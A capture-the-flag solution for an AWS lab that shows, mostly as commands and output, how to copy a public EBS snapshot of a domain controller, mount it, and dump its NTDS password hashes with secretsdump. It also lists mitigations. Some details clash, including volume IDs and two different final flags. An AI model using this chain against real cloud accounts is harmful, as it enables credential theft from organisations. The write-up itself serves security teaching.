# Challenge 04 - AWS Only: CloudCopy Attack - SOLUTION

## Overview

This document provides a complete step-by-step walkthrough for solving the CloudCopy challenge, which demonstrates stealing NTDS hashes from Windows Domain Controllers via EBS snapshot exploitation.

## Prerequisites

- Personal AWS account (separate from the CTF lab account)
- Linux instance in your personal account (Kali Linux recommended)
- AWS CLI configured with your personal account credentials

## Step-by-Step Solution

### Step 0: Initial IAM Enumeration

First, perform a comprehensive IAM enumeration to understand available permissions:

```bash
(.venv) root@9217d31e8742:/home/enumerate-iam# python enumerate-iam.py --access-key AKIAIOSFODNN7EXAMPLE --secret-key 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
2025-10-05 19:21:02,881 - 419 - [INFO] Starting permission enumeration for access-key-id "AKIAIOSFODNN7EXAMPLE"
2025-10-05 19:21:03,511 - 419 - [INFO] -- Account ARN : arn:aws:iam::908519937000:user/ctf-users/carlos.cardenas
2025-10-05 19:21:03,512 - 419 - [INFO] -- Account Id  : 908519937000
2025-10-05 19:21:03,512 - 419 - [INFO] -- Account Path: user/ctf-users/carlos.cardenas
2025-10-05 19:21:03,621 - 419 - [INFO] Attempting common-service describe / list brute force.
2025-10-05 19:21:04,159 - 419 - [INFO] -- sts.get_session_token() worked!
2025-10-05 19:21:04,255 - 419 - [INFO] -- sts.get_caller_identity() worked!
2025-10-05 19:21:05,733 - 419 - [ERROR] Remove globalaccelerator.describe_accelerator_attributes action
2025-10-05 19:21:11,190 - 419 - [INFO] -- ec2.describe_volumes() worked!
2025-10-05 19:21:11,409 - 419 - [INFO] -- dynamodb.describe_endpoints() worked!
2025-10-05 19:21:11,651 - 419 - [INFO] -- ec2.describe_instances() worked!
```

**Key Findings:**
- User identified as `carlos.cardenas`
- EC2 permissions include `describe_volumes`, `describe_instances` 
- STS permissions allow token generation and identity verification
- Account ID: `908519937000`

### Step 1: Initial Reconnaissance with carlos.cardenas

First, use the provided CTF credentials to enumerate available snapshots:

```bash
aws ec2 describe-snapshots --profile carlos --owner-ids self
```

This will show you what snapshots are available in the CTF environment that you have access to.

### Step 2: Verify Your Personal AWS Account

Next, confirm you're using your personal AWS account:

```bash
aws sts get-caller-identity --profile labs
```

**Expected Output:**
```json
{
    "UserId": "AIDAQRP34XG5B4APQL3KJ",
    "Account": "037572360634",
    "Arn": "arn:aws:iam::037572360634:user/AdminSpartan"
}
```

### Step 3: Discover the Public Snapshot

The MediCloudX infrastructure has a publicly accessible snapshot. Verify you can access it:

```bash
aws ec2 describe-snapshots --profile labs \
  --owner-ids 908519937000 \
  --snapshot-ids snap-0ba7ac0e074e8f5a9
```

**Expected Output:**
```json
{
    "Snapshots": [
        {
            "StorageTier": "standard",
            "TransferType": "standard",
            "CompletionTime": "2025-09-14T01:26:26.813000+00:00",
            "SnapshotId": "snap-0ba7ac0e074e8f5a9",
            "VolumeId": "vol-05712a93d050ab38c",
            "State": "completed",
            "StartTime": "2025-09-14T01:21:56.721000+00:00",
            "Progress": "100%",
            "OwnerId": "908519937000",
            "Description": "MediCloudX backup snapshot - Weekly automated backup",
            "VolumeSize": 50,
            "Encrypted": false
        }
    ]
}
```

**Key Observations:**
- Snapshot is `completed` and ready for use
- Contains 50GB of data from a server
- **Not encrypted** (security misconfiguration)
- Description indicates it's a routine backup

### Step 4: Copy the Public Snapshot

Since the snapshot is public, you can copy it directly to your account:

```bash
aws ec2 copy-snapshot --profile labs \
  --source-region us-east-1 \
  --source-snapshot-id snap-0ba7ac0e074e8f5a9 \
  --description "Copied DIc Emedicloudx.localDC snapshot for analysis"
```

**Expected Output:**
```json
{
    "SnapshotId": "snap-05c35b3ef6caba0d7"
}
```

**Note:** The copy process may take several minutes. Monitor progress with:
```bash
aws ec2 describe-snapshots --profile labs \
  --snapshot-ids snap-05c35b3ef6caba0d7 \
  --query 'Snapshots[0].[SnapshotId,State,Progress]'
```

### Step 5: Create Volume from Copied Snapshot

Once the copied snapshot is complete, create an EBS volume:

```bash
aws ec2 create-volume --profile labs \
  --availability-zone us-east-1c \
  --snapshot-id snap-05c35b3ef6caba0d7 \
  --volume-type gp3 \
  --tag-specifications 'ResourceType=volume,Tags=[{Key=Name,Value=DC-Analysis-Volume}]'
```

**Expected Output:**
```json
{
    "Iops": 3000,
    "Tags": [
        {
            "Key": "Name",
            "Value": "DC-Analysis-Volume"
        }
    ],
    "VolumeType": "gp3",
    "MultiAttachEnabled": false,
    "Throughput": 125,
    "VolumeId": "vol-003b7c326158d7109",
    "Size": 50,
    "SnapshotId": "snap-05c35b3ef6caba0d7",
    "AvailabilityZone": "us-east-1c",
    "State": "creating",
    "CreateTime": "2025-09-14T17:28:21+00:00",
    "Encrypted": false
}
```

### Step 6: Attach Volume to Analysis Instance

Attach the volume to your Kali Linux analysis instance:

```bash
aws ec2 attach-volume --profile labs \
  --volume-id vol-0e14149cee396e7a9 \
  --instance-id i-0a920c152144a6edf \
  --device /dev/sdf
```

**Expected Output:**
```json
{
    "VolumeId": "vol-003b7c326158d7109",
    "InstanceId": "i-0a920c152144a6edf",
    "Device": "/dev/sdf",
    "State": "attaching",
    "AttachTime": "2025-09-14T17:28:40.812000+00:00"
}
```

### Step 7: SSH to Analysis Instance

Connect to your Kali Linux instance:

```bash
ssh -i CursoHackingJunior.pem kali@34.203.221.110
```

### Step 8: Prepare the Environment

Install necessary tools and create mount point:

```bash
# Create mount point
sudo mkdir /mnt/dc-snapshot

# Check available block devices
lsblk -o NAME,SIZE,FSTYPE,TYPE,MOUNTPOINT,LABEL
```

**Expected Output:**
```
NAME      SIZE FSTYPE TYPE MOUNTPOINT LABEL
xvda       20G        disk
├─xvda1  19.9G ext4   part /
├─xvda14    3M        part
└─xvda15  124M vfat   part /boot/efi
xvdf       50G        disk
└─xvdf1    50G ntfs   part
```

**Install required packages:**
```bash
sudo apt update
sudo apt install -y ntfs-3g
sudo apt install python3-impacket
```

### Step 9: Mount the Windows Volume

Mount the NTFS volume in read-only mode:

```bash
sudo mount -o ro /dev/xvdf1 /mnt/dc-snapshot
```

**Verify mount:**
```bash
ls -la /mnt/dc-snapshot/
```

You should see typical Windows directories: `Windows/`, `Program Files/`, `Users/`, etc.

### Step 10: Extract Critical Files

Copy the NTDS database and SYSTEM registry hive:

```bash
# Copy NTDS database
sudo cp /mnt/dc-snapshot/Windows/NTDS/ntds.dit ~/ntds.dit

# Copy SYSTEM registry hive
sudo cp /mnt/dc-snapshot/Windows/System32/config/SYSTEM ~/SYSTEM

# Change ownership to current user
sudo chown $USER:$USER ~/ntds.dit ~/SYSTEM

# Verify files were copied
ls -la ~/ntds.dit ~/SYSTEM
```

### Step 11: Extract Password Hashes

Use Impacket's secretsdump to extract all password hashes:

```bash
impacket-secretsdump -system ~/SYSTEM -ntds ~/ntds.dit local -outputfile secrets
```

**Expected Output:**
```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x1e357782858dd409eef7119ae2ec414b
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 14218b7bc92973ca87550cfc6db2b0ac
[*] Reading and decrypting hashes from /home/kali/ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a9292c257e3ba955ec53996b689268de:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
EC2AMAZ-9GMMSQ6$:1000:aad3b435b51404eeaad3b435b51404ee:713338155fec84a6dc24f383f11ace55:::
```

### Step 12: Find the Target User Hash

Search for the `svc-flag` user in the extracted hashes:

```bash
grep "svc-flag" secrets.ntds
```

**Expected Output:**
```
svc-flag:1001:aad3b435b51404eeaad3b435b51404ee:8846F7EAEE8FB117AD06BDD830B7586C:::
```

### Step 13: Extract the Flag

The flag is the NT hash portion (after the third colon):

**Flag:** `8846F7EAEE8FB117AD06BDD830B7586C`

## Attack Flow Summary

1. **Permission Enumeration**: Used IAM enumeration tool to identify available permissions
2. **Initial Reconnaissance**: Used carlos.cardenas credentials to enumerate snapshots
3. **Target Discovery**: Identified public EBS snapshot from MediCloudX
4. **Cross-Account Access**: Exploited public snapshot permissions
5. **Data Exfiltration**: Copied snapshot to personal AWS account
6. **Volume Analysis**: Created volume and attached to analysis instance
7. **File System Access**: Mounted NTFS volume and extracted critical files
8. **Credential Extraction**: Used secretsdump to extract NTDS hashes
9. **Target Identification**: Located svc-flag user NT hash

## Key Vulnerabilities Exploited

1. **Public EBS Snapshots**: Snapshot was accessible to any AWS account
2. **Unencrypted Storage**: No encryption on EBS volumes or snapshots
3. **Weak Service Account**: svc-flag user had predictable weak password
4. **Overpermissive Backup Strategy**: Critical domain data in accessible backups

## Mitigation Strategies

### For EBS Snapshots:
- **Never make snapshots public** unless absolutely necessary
- Use **resource-based policies** to control snapshot sharing
- Enable **EBS encryption** with customer-managed KMS keys
- Implement **snapshot lifecycle policies** to automatically delete old snapshots

### For Active Directory:
- Use **strong, complex passwords** for all service accounts
- Implement **password rotation policies**
- Enable **Advanced Threat Protection** for domain controllers
- Use **Protected Users group** for sensitive accounts

### For AWS Security:
- Enable **CloudTrail logging** for all snapshot operations
- Set up **CloudWatch alerts** for unusual snapshot sharing activities
- Use **AWS Config rules** to detect public snapshots
- Implement **least privilege access** for IAM users and roles

## Tools Used

- **enumerate-iam.py**: For initial permission enumeration and discovery
- **AWS CLI**: For snapshot discovery and management
- **Impacket secretsdump**: For NTDS hash extraction
- **Linux mount utilities**: For NTFS volume access
- **Kali Linux**: As analysis platform

## Learning Outcomes

This challenge demonstrates:
- Real-world cloud security vulnerabilities
- Cross-account resource access exploitation
- Windows Active Directory credential extraction
- The importance of proper backup security
- Cloud-specific attack vectors and techniques

---

**Challenge Completed Successfully!**

**Final Flag:** `CLD[4d8f7e3a-9c2b-4e1a-8f3d-7b5e9a2c4f6e]`
